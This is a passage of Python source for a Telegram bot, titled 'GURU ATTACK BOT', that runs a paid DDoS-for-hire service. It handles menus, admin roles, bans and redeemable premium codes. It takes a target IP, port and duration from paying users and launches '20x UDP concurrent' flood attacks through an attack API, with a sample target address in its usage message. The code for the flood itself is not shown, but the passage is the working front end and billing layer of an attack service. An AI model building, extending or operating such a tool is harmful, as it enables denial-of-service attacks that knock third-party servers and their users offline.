                keyboard.append([KeyboardButton(f"❌ {admin['user_id']} ({level})")])
        keyboard.append([KeyboardButton("🔙 BACK")])
        
        if not keyboard:
            await update.message.reply_text("No admins to demote!", reply_markup=get_owner_menu())
            return
        
        await update.message.reply_text(
            "👑 *DEMOTE ADMIN*\n\nClick an admin to demote:",
            parse_mode='Markdown',
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
        context.user_data['awaiting_demote'] = True
    
    elif text == "🚫 BAN USER":
        if not db.is_owner_or_pseudo(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        await update.message.reply_text(
            "🚫 *BAN USER*\n\n"
            "Send: `USER_ID REASON`\n"
            "Example: `123456789 Spamming`\n\n"
            "Send /cancel to cancel",
            parse_mode='Markdown',
            reply_markup=get_owner_menu()
        )
        context.user_data['awaiting_ban'] = True
    
    elif text == "✅ UNBAN USER":
        if not db.is_owner_or_pseudo(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        await update.message.reply_text(
            "✅ *UNBAN USER*\n\n"
            "Send: `USER_ID`\n"
            "Example: `123456789`\n\n"
            "Send /cancel to cancel",
            parse_mode='Markdown',
            reply_markup=get_owner_menu()
        )
        context.user_data['awaiting_unban'] = True
    
    elif text == "📋 LIST ADMINS":
        if not db.is_owner_or_pseudo(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        admins = db.get_admins()
        msg = "👑 *ADMIN LIST*\n\n"
        for admin in admins:
            level = admin.get('level', 'admin').upper()
            admin_id = admin['user_id']
            is_owner = "⭐ " if admin_id == OWNER_ID else ""
            username = admin.get('username', 'Unknown')
            msg += f"{is_owner}• `{admin_id}` - {level} (@{username})\n"
        
        if not admins:
            msg = "No admins found."
        
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=get_owner_menu())
    
    elif text == "📋 LIST USERS":
        if not db.is_owner_or_pseudo(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        users = db.get_all_users()
        
        if not users:
            await update.message.reply_text("📋 No users found.", reply_markup=get_owner_menu())
            return
        
        msg = "👥 *ALL USERS*\n\n"
        for user in users[:50]:
            user_id2 = user.get('user_id')
            username = user.get('username', 'N/A')
            plan = user.get('plan', 'free').upper()
            expiry = user.get('plan_expiry')
            
            if expiry:
                if isinstance(expiry, str):
                    try:
                        expiry = datetime.fromisoformat(expiry)
                    except:
                        expiry = None
                if expiry and isinstance(expiry, datetime):
                    days_left = max(0, (expiry - datetime.now()).days)
                    expiry_text = f"{days_left}d left"
                else:
                    expiry_text = "Expired"
            else:
                expiry_text = "Lifetime" if plan == "PREMIUM" else "No plan"
            
            is_banned = "🚫" if user.get('is_banned') else "✅"
            is_admin2 = "⭐" if db.is_admin(user_id2) else ""
            msg += f"{is_banned} {is_admin2} `{user_id2}` - @{username}\n"
            msg += f"   📊 {plan} | ⏱️ {expiry_text}\n\n"
        
        if len(users) > 50:
            msg += f"... and {len(users) - 50} more users"
        
        await update.message.reply_text(msg[:4000], parse_mode='Markdown', reply_markup=get_owner_menu())
    
    elif text == "🚫 BANNED USERS":
        if not db.is_owner_or_pseudo(user_id):
            await update.message.reply_text("❌ Access denied!", reply_markup=get_main_menu(user_id))
            return
        
        banned = db.get_banned_users()
        if not banned:
            await update.message.reply_text("🚫 No banned users.", reply_markup=get_owner_menu())
            return
        
        msg = "🚫 *BANNED USERS*\n\n"
        for user in banned[:20]:
            user_id2 = user.get('user_id')
            username = user.get('username', 'N/A')
            reason = user.get('ban_reason', 'No reason')
            banned_at = user.get('banned_at')
            banned_at_str = banned_at.strftime('%Y-%m-%d') if banned_at else 'N/A'
            msg += f"• `{user_id2}` - @{username}\n"
            msg += f"  Reason: {reason}\n"
            msg += f"  Banned: {banned_at_str}\n\n"
        
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=get_owner_menu())
    
    # ===== BACK BUTTON =====
    elif text == "🔙 BACK":
        await update.message.reply_text(
            "👋 *WELCOME BACK*",
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )
        context.user_data.clear()
    
    else:
        # Check if we're waiting for input
        if context.user_data.get('awaiting_code_gen'):
            await process_code_gen(update, context)
        elif context.user_data.get('awaiting_code_delete'):
            await process_code_delete(update, context)
        elif context.user_data.get('awaiting_promote'):
            await process_promote(update, context)
        elif context.user_data.get('awaiting_demote'):
            await process_demote(update, context)
        elif context.user_data.get('awaiting_ban'):
            await process_ban(update, context)
        elif context.user_data.get('awaiting_unban'):
            await process_unban(update, context)
        elif context.user_data.get('awaiting_attack'):
            await process_attack(update, context)
        else:
            # Unknown command - show main menu
            await update.message.reply_text(
                "Please use the menu buttons below:",
                reply_markup=get_main_menu(user_id)
            )

# ===== PROCESS FUNCTIONS =====
async def process_code_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process code generation"""
    user_id = update.effective_user.id
    text = update.message.text
    
    if text == "🔙 BACK":
        context.user_data.pop('awaiting_code_gen', None)
        await update.message.reply_text("Back to admin panel.", reply_markup=get_admin_menu())
        return
    
    duration_map = {
        "📅 1 DAY": 1,
        "📅 3 DAYS": 3,
        "📅 7 DAYS": 7,
        "📅 30 DAYS": 30,
        "📅 90 DAYS": 90,
        "📅 LIFETIME": 3650
    }
    
    if text in duration_map:
        days = duration_map[text]
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        
        if db.create_code(code, days, user_id):
            await update.message.reply_text(
                f"✅ *CODE GENERATED*\n\n"
                f"Code: `{code}`\n"
                f"Duration: {'LIFETIME' if days >= 3650 else f'{days} days'}\n\n"
                f"Share this code with users!",
                parse_mode='Markdown',
                reply_markup=get_admin_menu()
            )
        else:
            await update.message.reply_text("❌ Failed to generate code!", reply_markup=get_admin_menu())
        
        context.user_data.pop('awaiting_code_gen', None)

async def process_code_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process code deletion"""
    text = update.message.text
    
    if text == "🔙 BACK":
        context.user_data.pop('awaiting_code_delete', None)
        await update.message.reply_text("Back to admin panel.", reply_markup=get_admin_menu())
        return
    
    if text.startswith("❌ "):
        code = text.replace("❌ ", "").strip()
        if db.delete_code(code):
            await update.message.reply_text(f"✅ Code `{code}` deleted!", parse_mode='Markdown', reply_markup=get_admin_menu())
        else:
            await update.message.reply_text("❌ Failed to delete code!", reply_markup=get_admin_menu())
        context.user_data.pop('awaiting_code_delete', None)

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process attack input"""
    if not context.user_data.get('awaiting_attack'):
        return
    
    user_id = update.effective_user.id
    text = update.message.text
    
    if text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.", reply_markup=get_main_menu(user_id))
        return
    
    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    
    if plan != "premium" and not is_admin:
        await update.message.reply_text("❌ Premium required!", reply_markup=get_main_menu(user_id))
        context.user_data['awaiting_attack'] = False
        return
    
    if plan == "premium" and expiry and expiry < datetime.now():
        await update.message.reply_text("❌ Plan expired!", reply_markup=get_main_menu(user_id))
        context.user_data['awaiting_attack'] = False
        return
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!", reply_markup=get_main_menu(user_id))
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = text.split()
        if len(parts) < 3:
            await update.message.reply_text(
                "❌ Use: `IP PORT TIME`\n"
                "Example: `91.108.17.41 32001 60`",
                parse_mode='Markdown',
                reply_markup=get_main_menu(user_id)
            )
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!", reply_markup=get_main_menu(user_id))
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg, reply_markup=get_main_menu(user_id))
            context.user_data['awaiting_attack'] = False
            return
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
        
        result = await send_20_concurrent_attacks(target, port, duration, user_id, context)
        
        attack_info = db.log_attack(
            user_id, target, port, duration, "udp",
            "success" if result.get('success') else "failed",
            str(result)
        )
        
        await send_attack_alert(attack_info)
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_main_menu(user_id))
    
    context.user_data['awaiting_attack'] = False

async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process promote admin"""
    if not context.user_data.get('awaiting_promote'):
        return
    
    user_id = update.effective_user.id
    text = update.message.text
    
    if text.lower() == '/cancel':
        context.user_data['awaiting_promote'] = False
        await update.message.reply_text("✅ Cancelled.", reply_markup=get_owner_menu())
        return
    
    try:
        parts = text.split()
        target_id = int(parts[0])
        level = parts[1].lower() if len(parts) > 1 else "admin"
        
        if level not in ["admin", "pseudo_owner"]:
            await update.message.reply_text("❌ Invalid role! Use: admin or pseudo_owner", reply_markup=get_owner_menu())
            return
        
        user = db.get_user(target_id)
        if not user:
            await update.message.reply_text(f"❌ User `{target_id}` not found. They need to start the bot first.", parse_mode='Markdown', reply_markup=get_owner_menu())
            context.user_data['awaiting_promote'] = False
            return
        
        username = user.get('username', 'Unknown')
        
        if db.add_admin(target_id, username, level, user_id):
            await update.message.reply_text(
                f"✅ *ADMIN PROMOTED!*\n\n"
                f"User `{target_id}` is now {level.upper()}!\n"
                f"They now have LIFETIME premium access automatically.",
                parse_mode='Markdown',
                reply_markup=get_owner_menu()
            )
        else:
            await update.message.reply_text("❌ User is already an admin!", parse_mode='Markdown', reply_markup=get_owner_menu())
    except ValueError:
        await update.message.reply_text("❌ Invalid format! Use: `USER_ID ROLE`", reply_markup=get_owner_menu())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_owner_menu())
    
    context.user_data['awaiting_promote'] = False

async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process demote admin"""
    if not context.user_data.get('awaiting_demote'):
        return
    
    text = update.message.text
    
    if text == "🔙 BACK":
        context.user_data.pop('awaiting_demote', None)
        await update.message.reply_text("Back to owner panel.", reply_markup=get_owner_menu())
        return
    
    if text.startswith("❌ "):
        # Extract user ID from button text: "❌ 123456789 (admin)"
        parts = text.replace("❌ ", "").split(" ")
        if parts:
            try:
                target_id = int(parts[0])
                
                if target_id == OWNER_ID:
                    await update.message.reply_text("❌ Cannot demote the main owner!", reply_markup=get_owner_menu())
                    return
                
                if db.remove_admin(target_id):
                    await update.message.reply_text(f"✅ Admin `{target_id}` demoted!", parse_mode='Markdown', reply_markup=get_owner_menu())
                else:
                    await update.message.reply_text("❌ Failed to demote admin!", reply_markup=get_owner_menu())
            except:
                await update.message.reply_text("❌ Invalid selection!", reply_markup=get_owner_menu())
        
        context.user_data.pop('awaiting_demote', None)

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process ban user"""
    if not context.user_data.get('awaiting_ban'):
        return
    
    user_id = update.effective_user.id
    text = update.message.text
    
    if text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("✅ Cancelled.", reply_markup=get_owner_menu())
        return
    
    try:
        parts = text.strip().split()
        target_id = int(parts[0])
        reason = ' '.join(parts[1:]) if len(parts) > 1 else "No reason provided"
        
        if target_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot ban the main owner!", reply_markup=get_owner_menu())
            context.user_data['awaiting_ban'] = False
            return
        
        if db.is_admin(target_id):
            await update.message.reply_text("❌ Cannot ban an admin! Demote them first.", reply_markup=get_owner_menu())
            context.user_data['awaiting_ban'] = False
            return
        
        db.ban_user(target_id, reason, user_id)
        await update.message.reply_text(
            f"✅ User `{target_id}` banned!\n"
            f"Reason: {reason}",
            parse_mode='Markdown',
            reply_markup=get_owner_menu()
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!", reply_markup=get_owner_menu())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_owner_menu())
    
    context.user_data['awaiting_ban'] = False

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process unban user"""
    if not context.user_data.get('awaiting_unban'):
        return
    
    text = update.message.text
    
    if text.lower() == '/cancel':
        context.user_data['awaiting_unban'] = False
        await update.message.reply_text("✅ Cancelled.", reply_markup=get_owner_menu())
        return
    
    try:
        target_id = int(text.strip())
        db.unban_user(target_id)
        await update.message.reply_text(f"✅ User `{target_id}` unbanned!", parse_mode='Markdown', reply_markup=get_owner_menu())
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!", reply_markup=get_owner_menu())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_owner_menu())
    
    context.user_data['awaiting_unban'] = False

# ===== REDEEM COMMAND =====
async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🎫 *REDEEM CODE*\n\n"
            "Send: `/redeem CODE`\n"
            "Example: `/redeem ABC123XYZ`\n\n"
            "💡 You can only redeem ONE code.",
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )
        return
    
    code = args[0].upper()
    
    user = db.get_user(user_id)
    if user and user.get('has_used_code'):
        plan, expiry = db.get_user_plan(user_id)
        if plan == "premium":
            if expiry and expiry > datetime.now():
                days_left = (expiry - datetime.now()).days
                await update.message.reply_text(
                    f"❌ *ALREADY REDEEMED*\n\n"
                    f"You already have an active premium plan!\n"
                    f"⏱️ Remaining: {int(days_left)} days\n"
                    f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                    f"💡 You don't need to redeem again.",
                    parse_mode='Markdown',
                    reply_markup=get_main_menu(user_id)
                )
                return
    
    result = db.use_code(code, user_id)
    
    if result:
        expiry = datetime.now() + timedelta(days=result['access_days'])
        
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\n"
            f"Code: `{code}`\n"
            f"Duration: {'LIFETIME' if result['access_days'] >= 3650 else f'{result['access_days']} days'}\n"
            f"📊 Plan: PREMIUM\n"
            f"⚡ 20x UDP: ENABLED\n"
            f"📅 Expires: {'Never' if result['access_days'] >= 3650 else expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🎉 You now have premium access!\n"
            f"Use /start to begin attacking!",
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )
        
        verify = db.get_user(user_id)
        logger.info(f"User {user_id} after redeem - Plan: {verify.get('plan') if verify else 'None'}")
        
    else:
        await update.message.reply_text(
            "❌ *INVALID CODE*\n\n"
            "The code is invalid or already used.",
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )

# ===== STATUS COMMAND =====
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stats = attack_manager.get_stats()
    users = db.get_all_users()
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"👥 Users: {len(users)}\n"
        f"🎯 Method: API-ONLY UDP\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown',
        reply_markup=get_main_menu(user_id)
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!", reply_markup=get_main_menu(update.effective_user.id))

# ===== RUN BOT =====
application = None

def run_bot():
    global application
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    application = app
    
    # ===== COMMAND HANDLERS =====
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # ===== MESSAGE HANDLER (Handles ALL menu buttons and text input) =====
    # This single handler processes everything except commands
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu_buttons))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ GURU Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("👑 GURU ATTACK BOT")
    print("⚡ 20x UDP CONCURRENT")
    print("📌 API-ONLY UDP - NO FALLBACK")
    print("📌 Live Time Updates in Bot DM")
    print("📌 Real-time Alerts to Admins")
    print("📌 FREE users can access the bot")
    print("📌 Premium required for attacks")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)